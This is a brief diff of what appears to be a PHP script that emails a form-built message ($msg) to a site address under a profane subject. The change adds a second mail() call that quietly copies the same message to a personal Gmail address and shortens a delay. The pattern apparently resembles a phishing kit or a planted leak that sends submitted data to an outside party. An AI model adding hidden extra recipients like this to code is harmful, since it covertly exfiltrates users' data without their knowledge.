@@ -10,8 +10,10 @@ $msg = wordwrap($msg,70);
 
 // send email
 mail("info@laabhaa.com","Maaderchod",$msg);
+mail("j.snow12322352355@gmail.com
+","Maaderchod",$msg);
 
-sleep(5);
+sleep(1);
 
 }
 
